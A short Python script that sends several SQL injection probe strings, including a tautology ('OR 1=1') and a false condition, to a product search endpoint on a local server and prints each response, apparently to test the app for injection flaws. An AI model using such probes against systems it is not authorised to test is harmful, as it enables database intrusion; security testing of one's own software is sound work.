import urllib.request, urllib.parse, urllib.error
for k in ["AWA'", "AWA' OR '1'='1", "AWA' AND '1'='2", "AWA\\", "AWA%' -- "]:
    url = 'http://127.0.0.1:8081/api/products/search?keyword=' + urllib.parse.quote(k)
    try:
        r = urllib.request.urlopen(url)
        body = r.read().decode('utf-8', 'replace')
        print('KEY=', repr(k), 'STATUS=', r.status, 'LEN=', len(body), 'BODY=', body[:300])
    except urllib.error.HTTPError as e:
        print('KEY=', repr(k), 'HTTP=', e.code, 'BODY=', e.read().decode('utf-8', 'replace')[:500])
    except Exception as e:
        print('KEY=', repr(k), 'ERR=', type(e).__name__, str(e)[:200])
